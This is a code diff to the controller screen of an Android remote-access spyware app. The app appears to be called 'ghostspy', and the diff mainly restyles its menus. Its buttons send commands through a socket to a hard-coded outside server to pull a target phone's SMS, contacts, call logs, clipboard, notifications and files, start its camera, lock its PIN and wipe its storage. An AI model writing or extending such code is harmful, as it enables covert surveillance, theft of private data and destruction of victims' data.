@@ -5,6 +5,7 @@ import android.app.AlertDialog;
 import android.content.Intent;
 import android.os.Bundle;
 import android.view.Gravity;
+import android.view.animation.ScaleAnimation;
 import android.widget.*;
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -14,74 +15,61 @@ import java.net.URISyntaxException;
 public class ControlActivity extends Activity {
     private Socket socket;
     private String deviceId;
-    private Button flashlightBtn;
-    private boolean isFlashOn = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
         deviceId = getIntent().getStringExtra("deviceId");
         String model = getIntent().getStringExtra("deviceModel");
         String battery = getIntent().getStringExtra("battery");
 
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setBackgroundColor(0xFF080808);
-        layout.setPadding(16, 16, 16, 16);
+        LinearLayout root = new LinearLayout(this);
+        root.setOrientation(LinearLayout.VERTICAL);
+        root.setBackgroundColor(0xFF090909);
+        setContentView(root);
 
-        // Top bar
-        LinearLayout topBar = new LinearLayout(this);
-        topBar.setOrientation(LinearLayout.HORIZONTAL);
-        topBar.setGravity(Gravity.CENTER_VERTICAL);
-        topBar.setPadding(0, 0, 0, 16);
+        // Header
+        LinearLayout header = new LinearLayout(this);
+        header.setOrientation(LinearLayout.HORIZONTAL);
+        header.setGravity(Gravity.CENTER_VERTICAL);
+        header.setBackgroundColor(0xFF171717);
+        header.setPadding(16, 12, 16, 12);
 
         Button backBtn = new Button(this);
         backBtn.setText("←");
         backBtn.setTextColor(0xFFFFFFFF);
         backBtn.setBackgroundColor(0x00000000);
         backBtn.setOnClickListener(v -> finish());
-        topBar.addView(backBtn);
+        header.addView(backBtn);
 
-        TextView infoCapsule = new TextView(this);
-        infoCapsule.setText(model + " | Bat: " + battery + "%");
-        infoCapsule.setTextColor(0xFFFFFFFF);
-        infoCapsule.setPadding(12, 8, 12, 8);
-        infoCapsule.setBackgroundColor(0xFF151515);
-        LinearLayout.LayoutParams capsParams = new LinearLayout.LayoutParams(
+        TextView info = new TextView(this);
+        info.setText(model + " | Bat: " + battery + "%");
+        info.setTextColor(0xFFFFFFFF);
+        info.setPadding(12, 6, 12, 6);
+        info.setBackgroundColor(0xFF171717);
+        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                 0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-        capsParams.setMargins(12, 0, 12, 0);
-        infoCapsule.setLayoutParams(capsParams);
-        infoCapsule.setGravity(Gravity.CENTER);
-        topBar.addView(infoCapsule);
+        info.setLayoutParams(infoParams);
+        info.setGravity(Gravity.CENTER);
+        header.addView(info);
 
-        TextView notifBadge = new TextView(this);
-        notifBadge.setText("2");
-        notifBadge.setTextColor(0xFFFFFFFF);
-        notifBadge.setBackgroundColor(0xFFFF1744);
-        notifBadge.setPadding(10, 4, 10, 4);
-        topBar.addView(notifBadge);
-        layout.addView(topBar);
+        TextView notif = new TextView(this);
+        notif.setText("2");
+        notif.setTextColor(0xFFFFFFFF);
+        notif.setBackground(getDrawable(R.drawable.btn_admin));
+        notif.setPadding(10, 4, 10, 4);
+        header.addView(notif);
+        root.addView(header);
 
-        // Toggle Flashlight
-        flashlightBtn = new Button(this);
-        flashlightBtn.setText("🔦 Flashlight: OFF");
-        flashlightBtn.setTextColor(0xFFFFFFFF);
-        flashlightBtn.setBackgroundColor(0xFF151515);
-        flashlightBtn.setOnClickListener(v -> {
-            isFlashOn = !isFlashOn;
-            flashlightBtn.setText(isFlashOn ? "🔦 Flashlight: ON" : "🔦 Flashlight: OFF");
-            flashlightBtn.setBackgroundColor(isFlashOn ? 0xFF00E676 : 0xFF151515);
-            sendCmd("flashlight", new JSONObject());
-        });
-        layout.addView(flashlightBtn);
-
-        // Grid 4 kolom
+        // Grid Menu 2 kolom
+        ScrollView scroll = new ScrollView(this);
         LinearLayout grid = new LinearLayout(this);
         grid.setOrientation(LinearLayout.VERTICAL);
+        grid.setPadding(16, 12, 16, 12);
+
         String[][] items = {
             {"📷", "Kamera", "#FF1744", "start_camera"},
-            {"💬", "SMS Baru", "#FF4D8D", "get_sms"},
+            {"💬", "SMS", "#FF4D8D", "get_sms"},
             {"👥", "Kontak", "#00E676", "get_contacts"},
             {"📞", "Panggilan", "#FFC107", "get_calls"},
             {"📋", "Clipboard", "#2ED8FF", "get_clipboard"},
@@ -89,176 +77,120 @@ public class ControlActivity extends Activity {
             {"🌐", "Jaringan", "#9C27B0", "get_network"},
             {"🔔", "Notifikasi", "#FF9800", "get_notifications"},
             {"📶", "WiFi Scan", "#00BCD4", "wifiscan"},
-            {"🕒", "WiFi Hist", "#3F51B5", "wifihistory"},
+            {"📁", "File Mgr", "#FF5722", "list_files"},
             {"📡", "Cell Tower", "#607D8B", "celltower"},
-            {"📁", "File Mgr", "#FF5722", "list_files"}
+            {"🕒", "WiFi Hist", "#3F51B5", "wifihistory"}
         };
 
         LinearLayout row = null;
         for (int i = 0; i < items.length; i++) {
-            if (i % 3 == 0) {
+            if (i % 2 == 0) {
                 row = new LinearLayout(this);
                 row.setOrientation(LinearLayout.HORIZONTAL);
                 grid.addView(row);
             }
-            String[] item = items[i];
-            TextView card = new TextView(this);
-            card.setText(item[0] + "\n" + item[1]);
-            card.setTextColor(0xFFFFFFFF);
-            card.setGravity(Gravity.CENTER);
-            card.setBackgroundColor((int) Long.parseLong(item[2].substring(1), 16) | 0x22000000);
-            card.setPadding(8, 18, 8, 18);
-            LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 130, 1);
-            p.setMargins(6, 6, 6, 6);
-            card.setLayoutParams(p);
-            card.setOnClickListener(v -> handleAction(item[3]));
-            row.addView(card);
+            row.addView(createMenuCard(items[i]));
         }
-        layout.addView(grid);
+        scroll.addView(grid);
+        root.addView(scroll);
 
-        // Pusat Kontrol Button
-        Button controlCenterBtn = new Button(this);
-        controlCenterBtn.setText("🎛️ Pusat Kontrol");
-        controlCenterBtn.setTextColor(0xFFFFFFFF);
-        controlCenterBtn.setBackgroundColor(0xFFFF1744);
-        controlCenterBtn.setOnClickListener(v -> showControlCenterPopup());
-        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
-        btnParams.setMargins(0, 24, 0, 0);
-        controlCenterBtn.setLayoutParams(btnParams);
-        layout.addView(controlCenterBtn);
-
-        setContentView(layout);
+        // Control Center (dummy, bisa di-swipe nanti)
+        TextView controlCenter = new TextView(this);
+        controlCenter.setText("🎛️ Control Center");
+        controlCenter.setTextColor(0xFFFFFFFF);
+        controlCenter.setBackground(getDrawable(R.drawable.card_admin));
+        controlCenter.setPadding(16, 12, 16, 12);
+        controlCenter.setGravity(Gravity.CENTER);
+        controlCenter.setOnClickListener(v -> showControlPopup());
+        root.addView(controlCenter);
 
         try {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
             socket.connect();
-        } catch (URISyntaxException e) {
-            Toast.makeText(this, "Socket error", Toast.LENGTH_SHORT).show();
-        }
+        } catch (URISyntaxException e) {}
+    }
+
+    private LinearLayout createMenuCard(String[] item) {
+        LinearLayout card = new LinearLayout(this);
+        card.setOrientation(LinearLayout.VERTICAL);
+        card.setGravity(Gravity.CENTER);
+        card.setBackgroundColor((int) Long.parseLong(item[2].substring(1), 16) | 0x22000000);
+        card.setPadding(8, 20, 8, 20);
+        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(0, 150, 1);
+        params.setMargins(6, 6, 6, 6);
+        card.setLayoutParams(params);
+
+        TextView icon = new TextView(this);
+        icon.setText(item[0]);
+        icon.setTextSize(28);
+        icon.setGravity(Gravity.CENTER);
+
+        TextView label = new TextView(this);
+        label.setText(item[1]);
+        label.setTextColor(0xFFFFFFFF);
+        label.setTextSize(12);
+        label.setGravity(Gravity.CENTER);
+        label.setPadding(0, 8, 0, 0);
+
+        card.addView(icon);
+        card.addView(label);
+
+        card.setOnClickListener(v -> {
+            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
+                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
+                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
+            scale.setDuration(150);
+            scale.setRepeatCount(0);
+            v.startAnimation(scale);
+            handleAction(item[3]);
+        });
+
+        return card;
     }
 
     private void handleAction(String cmd) {
-        Intent intent = null;
+        Intent i = null;
         switch (cmd) {
-            case "start_camera":
-                intent = new Intent(this, CameraActivity.class);
-                break;
-            case "get_sms":
-                intent = new Intent(this, SmsActivity.class);
-                break;
-            // Tambahkan case lain nanti
+            case "start_camera": i = new Intent(this, CameraActivity.class); break;
+            case "get_sms": i = new Intent(this, SmsActivity.class); break;
         }
-        if (intent != null) {
-            intent.putExtra("deviceId", deviceId);
-            startActivity(intent);
+        if (i != null) {
+            i.putExtra("deviceId", deviceId);
+            startActivity(i);
         } else {
-            sendCmd(cmd, new JSONObject());
+            sendCmd(cmd);
         }
     }
 
-    private void showControlCenterPopup() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("🎛️ Pusat Kontrol");
-        LinearLayout popupLayout = new LinearLayout(this);
-        popupLayout.setOrientation(LinearLayout.VERTICAL);
-        popupLayout.setPadding(16, 16, 16, 16);
-
-        String[][] controls = {
-            {"🌐", "Buka Website", "Remote browsing target", "openurl"},
-            {"🔦", "Nyalakan Flash", "Kontrol flashlight", "flashlight"},
-            {"📳", "Getarkan", "Vibrate custom", "vibrate"},
-            {"💬", "Teks Layar", "Tampilkan toast", "toast"},
-            {"🔊", "Kirim Suara", "Text-to-Speech", "speak"},
-            {"🔒", "Kunci HP", "Lock target PIN", "lock"},
-            {"🔓", "Unlock HP", "Buka kunci", "unlock"},
-            {"📞", "Panggil", "Trigger call", "call"},
-            {"🖼️", "Ubah Wallpaper", "Set dari URL", "wallpaper"},
-            {"🎵", "Putar Musik", "Play audio URL", "playmusic"},
-            {"📶", "Lag Sinyal", "Atur game", "lagsignal"},
-            {"🔔", "Notifikasi", "Push notification", "notify"},
-            {"🗑️", "Hapus File", "Wipe storage", "wipe"}
-        };
-
-        LinearLayout row = null;
-        for (int i = 0; i < controls.length; i++) {
-            if (i % 2 == 0) {
-                row = new LinearLayout(this);
-                row.setOrientation(LinearLayout.HORIZONTAL);
-                popupLayout.addView(row);
-            }
-            String[] ctrl = controls[i];
-            LinearLayout card = new LinearLayout(this);
-            card.setOrientation(LinearLayout.VERTICAL);
-            card.setPadding(12, 12, 12, 12);
-            card.setBackgroundColor(0xFF151515);
-            LinearLayout.LayoutParams cp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
-            cp.setMargins(4, 4, 4, 4);
-            card.setLayoutParams(cp);
-            card.setGravity(Gravity.CENTER);
-
-            TextView iconView = new TextView(this);
-            iconView.setText(ctrl[0]);
-            iconView.setTextSize(24);
-            iconView.setGravity(Gravity.CENTER);
-
-            TextView titleView = new TextView(this);
-            titleView.setText(ctrl[1]);
-            titleView.setTextColor(0xFFFFFFFF);
-            titleView.setTextSize(14);
-            titleView.setTypeface(null, android.graphics.Typeface.BOLD);
-            titleView.setGravity(Gravity.CENTER);
-
-            TextView descView = new TextView(this);
-            descView.setText(ctrl[2]);
-            descView.setTextColor(0xFF9AA3B2);
-            descView.setTextSize(11);
-            descView.setGravity(Gravity.CENTER);
-
+    private void showControlPopup() {
+        AlertDialog.Builder b = new AlertDialog.Builder(this);
+        b.setTitle("🎛️ Control Center");
+        LinearLayout lay = new LinearLayout(this);
+        lay.setOrientation(LinearLayout.VERTICAL);
+        String[] cmds = {"flashlight", "vibrate", "lock", "unlock", "toast", "openurl", "wipe"};
+        for (String cmd : cmds) {
             Button btn = new Button(this);
-            btn.setText("▶ Jalankan");
+            btn.setText(cmd);
             btn.setTextColor(0xFFFFFFFF);
-            btn.setBackgroundColor(0xFFFF1744);
-            btn.setOnClickListener(v -> {
-                sendCmd(ctrl[3], new JSONObject());
-            });
-
-            card.addView(iconView);
-            card.addView(titleView);
-            card.addView(descView);
-            card.addView(btn);
-            row.addView(card);
+            btn.setBackgroundColor(0xFF171717);
+            btn.setOnClickListener(v -> sendCmd(cmd));
+            lay.addView(btn);
         }
-
-        builder.setView(popupLayout);
-        builder.setNegativeButton("Tutup", null);
-        builder.show();
+        b.setView(lay);
+        b.setNegativeButton("Tutup", null);
+        b.show();
     }
 
-    private void sendCmd(String cmd, JSONObject params) {
+    private void sendCmd(String cmd) {
         if (socket != null && socket.connected()) {
             JSONObject msg = new JSONObject();
             try {
                 msg.put("device_id", deviceId);
                 msg.put("command", cmd);
-                msg.put("params", params);
+                msg.put("params", new JSONObject());
                 socket.emit("command", msg);
                 Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
             } catch (Exception e) {}
-        } else {
-            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
         }
     }
-
-    private void showInputDialog(String title, InputCallback callback) {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle(title);
-        EditText input = new EditText(this);
-        builder.setView(input);
-        builder.setPositiveButton("OK", (d, w) -> callback.onInput(input.getText().toString()));
-        builder.setNegativeButton("Batal", null);
-        builder.show();
-    }
-
-    interface InputCallback { void onInput(String input); }
 }
